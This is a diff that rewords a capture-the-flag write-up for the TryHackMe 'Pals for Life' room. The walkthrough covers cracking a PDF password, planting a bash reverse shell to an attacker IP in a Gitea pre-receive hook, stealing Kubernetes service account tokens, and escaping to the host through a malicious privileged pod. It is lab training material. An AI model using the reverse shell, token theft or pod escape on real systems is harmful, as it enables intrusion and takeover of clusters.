@@ -6,7 +6,7 @@ https://tryhackme.com/room/palsforlife
 
 ## Enumeration:
 
-I started with the quick rustscan for port & service scan, this showed me multiple open ports open & running in the target host:
+Commencing with a swift Rustscan to conduct a comprehensive port and service scan:
 
 ```Rust
 sudo rustscan -a 10.10.153.17 -- -sC -sV -vv -oN result_nmap
@@ -232,21 +232,21 @@ SF:ywords\"\x20content=\"");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-After observing these many open ports I browsed through them one by one:
+The scan revealed multiple open ports on the target host. I proceeded to investigate each port individually:
 
-  - port 6443
+  - **Port 6443**:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/ad46ee9a-f5cc-4b87-86f7-9dcbb1f71581)
 
-  - port 10250
+  - **Port 10250**:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/bdbe5a61-191f-411e-adfc-ab60fb672c14)
 
-  - port 30180
+  - **Port 30180**:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/a7eb9977-af18-4ec0-81a7-549fbc4e0cb1)
 
-  - port 31111
+  - **Port 31111**:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/fc343094-7892-471a-8438-3a7b0a895cbe)
 
@@ -254,16 +254,15 @@ After observing these many open ports I browsed through them one by one:
 
 ### Web & Git Enumeration:
 
-Port 6443 & 10250 are being in use by the kubernetes cluster whereas port 30180 & 31111 are having http services running.
-Since on port 31111 git application is running, I registered my self using a username "nimda" & in the explore section I observed another user "leeroy":
+Ports 6443 and 10250 are dedicated to the Kubernetes cluster, while ports 30180 and 31111 host HTTP services. Exploring port 31111, which runs a Git application, I registered as "nimda" and discovered another user, "leeroy":
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/6bca129f-ab52-4da9-92b9-8547c8963b7a)
 
-Although currently I can't see any data into the leeroy profile:
+However, the "leeroy" profile currently lacks visible data:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/d603e9d5-e4a7-4c28-94e6-eb1377407a7e)
 
-On the other hand I observed another sub-directory '/team' in the http host running on port 30180:
+On a different note, a sub-directory '/team' on the HTTP host (port 30180) revealed a mysterious message:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/9b0db239-b0a2-43d2-9940-56daf81b3d31)
 
@@ -271,29 +270,27 @@ Browsing through this page I got this message:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b6451e5e-b46f-4fe9-a406-b3a605668b06)
 
-And going through the source code of the page I found base64 encoded pdf file "uninteresting_file.pdf":
+Further investigation into the source code unveiled a base64-encoded PDF file, "uninteresting_file.pdf":
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/087c11b8-106f-4bd1-a81c-937d9d3d486f)
 
-When I tried to open this file I observed that this file is password protected:
+Upon attempting to open the file, it became evident that a password was required:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/433387fd-cfac-4cf8-8aa6-e23862e44a7d)
 
-I used "pdf2john" to convert the file into JohnTheRipper format, to crack the password :
+To proceed, I utilized "pdf2john" to convert the file to JohnTheRipper format for password cracking:
 
 ```bash
 pdf2john uninteresting_file.pdf > pdf.hash
 ```
-Once the file is converted I used John to crack the file using rockyou wordlist:
+Cracking the password using the rockyou wordlist with JohnTheRipper swiftly revealed the access key:
 
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
 ```
-In just few moments I got the password of the file:
-
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/2f427596-a466-4f20-90ae-87c6673b78a3)
 
-Using this password when I opened the PDF file I observed another password like string, which seems like passwrod for the user "leeroy":
+Opening the PDF file with the acquired password exposed another string resembling a password for the user "leeroy":
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/4d5a1f73-70f0-4532-9ebe-9d214ba263a9)
 
@@ -301,15 +298,15 @@ Using this password when I opened the PDF file I observed another password like 
 
 ### Flag1:
 
-Using those credential I am finally able to log in into Lerroy account:
+Upon successfully logging into Leeroy's account using the acquired credentials:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/97209883-67c1-4d63-8505-71c363e0d586)
 
-Leeroy account is only having 1 single repository but after enumerating for sometime I found secret in webhook section:
+Within Leeroy's account, a single repository was discovered. Further enumeration led to the identification of a secret in the webhook section:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/ab28a140-828d-44dc-8773-dd4b0a4a5d4c)
 
-Although the secret isn't in the plain text but checking the source code of the webpage I found the clear text secret which is the first flag of this room: (pwn3d!🙂)
+Although the secret was initially obfuscated, inspecting the webpage's source code revealed the plaintext secret, constituting the first flag for this room:(pwn3d!🙂)
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/4213d367-2c71-4adc-b5aa-d1bc0b1b34f2)
 
@@ -317,15 +314,14 @@ Although the secret isn't in the plain text but checking the source code of the 
 
 ## Initial access:
 
-Since Leeroy is having the admin access on the Git instance, I was able to modify the GitHooks. Leveraging this situation I modified the pre-receive hook & added the bash reverse shell in it.
-I also started my netcat listener to listen for the reverse shell:
+Given Leeroy's administrative access on the Git instance, I exploited this privilege to modify the GitHooks. In this exploit, I inserted a bash reverse shell into the pre-receive hook and initiated a netcat listener to capture the reverse shell:
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.6.79.71/53 0>&1'
 ```
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/fc7bdc7d-d053-4627-bda4-e01309a147eb)
 
-After updating the hook, I went back to the Leeroy readme.md & just added another "!" to update new changes, once I clicked on the update I got the reverse shell back to my listener, running as a user "git":
+After updating the hook, I navigated back to Leeroy's readme.md file and made a minor modification, adding an exclamation mark. Upon updating, the reverse shell connection was successfully established, running under the user "git":
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/c59a891b-fcb0-453e-b661-ea5416348f48)
 
@@ -333,8 +329,7 @@ After updating the hook, I went back to the Leeroy readme.md & just added anothe
 
 ### Flag2:
 
-Once getting the initial access I started with the manual enumeration & while checking the root directory I found that I am having all access on the root folder.
-Also, the root folder conatins the second flag in for which I am having the sufficient access to cat the file: (pwn3d!🙂)
+Upon gaining initial access, a manual enumeration revealed full access to the root directory. Within the root folder, the second flag was discovered, and with the acquired privileges, I successfully retrieved its contents: (pwn3d!🙂)
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/e6f858da-bdaa-47ec-9af6-149cc3b18065)
 
@@ -343,16 +338,16 @@ Also, the root folder conatins the second flag in for which I am having the suff
 
 ## Flag 3:
 
-While performing the manual enumeration I observed a kuberneets secretaccount folder in "/var/run/secrets/kubernetes.io/serviceaccount" which contains certificate & toekens in it:
+During manual enumeration, I discovered a Kubernetes service account folder located at "/var/run/secrets/kubernetes.io/serviceaccount." Within this folder, I found certificates and tokens:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/c2ed6349-3055-47ac-a109-7caef9dab81d)
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/43acdb44-2c38-4b1a-aab2-7c3b26361db5)
 
-I copied these certificate & token file to my local host & used it for further Kubernetes authetication on port 6443, which I already discovered while ports & service scan section.
+Copying these certificate and token files to my local host, I utilized them for Kubernetes authentication on port 6443, a port previously identified during the port and service scan.
 
 ### Kubernetes:
 
-I exported token in the environment to avoid the multiple copy paste & used a tool called "kubectl" for authetication:
+To streamline the process and avoid multiple copy-pasting, I exported the token into the environment and utilized the "kubectl" tool for authentication:
 
 ```bash
 export token=$(cat token)
@@ -376,7 +371,7 @@ kubectl --server https://10.10.103.155:6443 --certificate-authority=ca.crt --tok
 kubectl --server https://10.10.103.155:6443 --certificate-authority=ca.crt --token=$token get secrets --all-namespaces #to check all secrest present in the namespaces
 ```
 
-Using the above command I observed flag 3 in one of the namepsaces:
+Through the above command, I identified flag 3 in one of the namespaces:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/fa3c3372-d3ce-4daa-a2de-f5d79c7c30a3)
 
@@ -384,7 +379,7 @@ Using the above command I observed flag 3 in one of the namepsaces:
 kubectl --server https://10.10.103.155:6443 --certificate-authority=ca.crt --token=$token get secret flag3 -n kube-system -o yaml #to check the file content in yaml format
 ```
 
-Using this above command I finally discovered the 3rd flag from the container: (pwn3d!🙂)
+Using this command, I successfully retrieved the 3rd flag from the container: (pwn3d!🙂)
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/9911ad09-952d-42ff-a31f-f68ca7584bfa)
 
@@ -392,10 +387,9 @@ Using this above command I finally discovered the 3rd flag from the container: (
 
 ## Flag 4:
 
-Now, I have to perform privilege escalation & get the root access on the target host to fetch the final flag. From the kubernetes enumeration I am already aware that using token & certificate I can create the new POD.
-Leveraging this misconfiguration I checked the yaml structure for one of the POD to create a new malicious POD, that will get execute my bash reverse shell & also mount the root directory.
+To escalate privileges and gain root access on the target host, I exploited a misconfiguration in Kubernetes. From previous Kubernetes enumeration, I identified that using a token and certificate, I could create a new POD.
 
-I checked the structure of the Gitea-0 POD & used the same image name to create a malicious POD:
+Analyzing the structure of the existing Gitea-0 POD, I crafted a YAML file for a malicious POD. The malicious POD utilized the same image name as the Gitea-0 POD to create confusion.
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/21a41463-f9b9-480b-954f-3780cb3aa7fd)
 
@@ -404,7 +398,7 @@ kubectl --server https://10.10.132.252:6443 --certificate-authority=ca.crt --tok
 ```
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/8694d906-2d93-40ae-8afd-a1e422ba4ff9)
 
-After using the same image name my yaml file was looking something like this:
+The crafted YAML file resembled the following:
 
 ```yaml
 apiVersion: v1
@@ -429,7 +423,7 @@ spec:
   hostNetwork: true
 ```
 
-Once the yaml file is ready I created a new pod using this new yaml file:
+After preparing the YAML file, I created a new POD using the following command:
 
 ```bash
 kubectl --server https://10.10.132.252:6443 --certificate-authority=ca.crt --token=$token apply -f kill3r1.yaml
@@ -437,14 +431,14 @@ kubectl --server https://10.10.132.252:6443 --certificate-authority=ca.crt --tok
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/96ce61d1-9a8b-4173-8662-cf0f655d6139)
 
-Checking the pod list again I observed my newly created pod in the list:
+Upon checking the list of pods again, the newly created pod was visible:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/4edfe128-aee1-4128-b6be-3ce43309899b)
 
-The moment POD creation is completed I got the connection back on my netcat listener:
+As soon as the POD creation was complete, I received a connection back on my netcat listener:
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/68161b93-478b-4b93-b36b-fdfe464f2c12)
 
-Moving into the "/mnt" folder as this folder contains the data from the "/" folder, I got 4th flag in the root folder: (pwn3d!🙂)
+Navigating to the "/mnt" folder, which contains data from the "/", I discovered the 4th flag in the root directory: (pwn3d!🙂)
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/6cb5fef6-a231-4247-b762-fcc7ed050ac0)
